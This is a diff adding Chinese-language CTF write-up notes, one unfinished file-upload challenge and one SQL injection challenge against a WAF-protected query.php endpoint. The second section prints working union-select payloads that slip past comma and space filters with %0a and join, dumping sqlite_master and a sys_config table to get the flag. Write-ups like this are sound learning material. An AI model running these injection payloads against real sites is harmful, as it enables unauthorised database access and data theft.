@@ -133,3 +133,53 @@ session每次都是动态刷新的，来自于访问/home时的session....应该
 md表格里面搞不出管道,将就看一下
 
 
+
+
+
+**白帽小 K 的故事（1）**
+
+鸣潮好评   跳过剧情之后看到是传一个mp3文件，看一下提示有前端和文件上传字样，还要注意接口，那么就看一下前端，发现有一段特殊的注释：
+
+<img width="1323" height="670" alt="image" src="https://github.com/user-attachments/assets/9a7e91f8-f1f4-4256-ab14-87cd2456c377" />
+
+这里就是一个文件读取接口，成功返回success，然后说只能传MP3，那么我们可以试试直接写php命令....等我再沉淀沉淀
+
+
+
+
+**小 E 的管理系统**
+
+题目描述是带waf的SQL注入，在界面尝试了一下感觉好像都被过滤了，可能注入点不在这里，然后抓了个包看看，发现是这样的：
+
+<img width="932" height="99" alt="image" src="https://github.com/user-attachments/assets/f834e23b-6d8b-4841-99bf-92e82e84d019" />
+
+这里后面是query.php后面再get拼接id，因此我们可以在query路径下执行注入，然后fuzz一波之后过滤了逗号，空格，然后这里用单引号也被waf了，再尝试一下确定是数字型注入，用%0a和join来绕过过滤，后面就是基本的操作了，先查个字段：
+
+<img width="1679" height="542" alt="image" src="https://github.com/user-attachments/assets/36087a68-c9a8-4d56-876b-ce1e1d4a92ba" />
+
+找回显位：
+```
+?id=1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%0a5)
+```
+
+<img width="2106" height="179" alt="image" src="https://github.com/user-attachments/assets/09431e0d-fe93-41d6-8606-7137ee29fae9" />
+
+可以发现回显位为1，但是后面做不下去了，可能是我还没学到位。。。废了week2没几道做得出来的，这里先给个wp，以后再研究：
+
+```
+0%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%0agroup_concat(sql)%0afrom%0asqlite_master)
+```
+<img width="3048" height="190" alt="image" src="https://github.com/user-attachments/assets/be33e998-a68e-476a-a681-2a80a26b4505" />
+
+看着比较重要的是config value，查一下：
+
+```
+0%0aunion%0aselect%0a*%0afrom%0a(select%0a1)%0ajoin%0a(select%0a2)%0ajoin%0a(select%0a3)%0ajoin%0a(select%0a4)%0ajoin%0a(select%09group_concat(config_value)%09from%09sys_config)
+```
+可以直接看到flag：
+
+<img width="1518" height="128" alt="image" src="https://github.com/user-attachments/assets/6c3a6540-3420-413b-bdb2-0accc08fe1ed" />
+
+
+
+
